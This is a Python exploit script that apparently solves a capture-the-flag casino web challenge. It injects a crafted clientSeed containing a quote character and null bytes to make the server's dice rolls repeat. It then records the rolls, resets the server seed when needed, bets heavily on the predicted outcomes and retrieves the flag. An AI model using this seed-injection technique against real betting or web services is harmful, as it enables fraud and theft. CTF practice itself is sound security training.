import requests
import json

session = requests.Session()

register_url = 'http://casino.web.jctf.pro/register'
login_url = 'http://casino.web.jctf.pro/login'
info_url = "http://casino.web.jctf.pro/info"
bet_url = "http://casino.web.jctf.pro/bet"
flag_url = "http://casino.web.jctf.pro/flag"
new_server_seed_url = "http://casino.web.jctf.pro/revealServerSeed"


payload = {
    'username': 'yourluuckyman666',
    'password': 'your_password'
}

session.post(register_url, data=payload).text # Register

session.post(login_url, data=payload).text # Login

r = json.loads(session.get(info_url).text) # Get information

index=0
balance = r["balance"]
guess = "6"
bet = "1"
nonce = 0
right_guesses = []
while balance != 0:

    if nonce < 20: # payload 10-20
        clientSeed = "aaaaaaaaaÊÊaaaaaaaaaaaa" + "\"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00aa" 
    else:  # payload 20-30
        clientSeed = "aaaaaaaaaååaaaaaaaaaaaa" + "\"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00aa"


    data = {"bet": bet, "guess": guess, "clientSeed": clientSeed}
    r = json.loads(session.post(bet_url, data=data).text)
    
    new_balance = r["balance"]
    nonce = r["nonce"]
    right_guess = str(r["roll"])
    print(f"Balance: {new_balance}, Nonce: {nonce}, Bet: {bet}, Guess: {guess}, Right Guess: {right_guess}, Guesses:  {str(right_guesses)}")

    if nonce == 31: # Reset Server Seeds
        session.get(new_server_seed_url)
        right_guesses = []
        index = 0
        bet = "1"

    if (nonce > 10 and nonce <= 30):
        right_guesses.append(right_guess)
        if nonce > 19:
            if guess != right_guess and nonce > 20: # Server seed dont fit
                session.get(new_server_seed_url)
                index = 0
                bet = "1"
                right_guesses = []
            else:
                guess = right_guesses[index]
                bet = new_balance / 2 # Lets bet big
                index = index + 1

    if new_balance >= 1000000000: # We win
        r = session.get(flag_url, data=data)
        print(r.text)
        break
    
    balance = new_balance

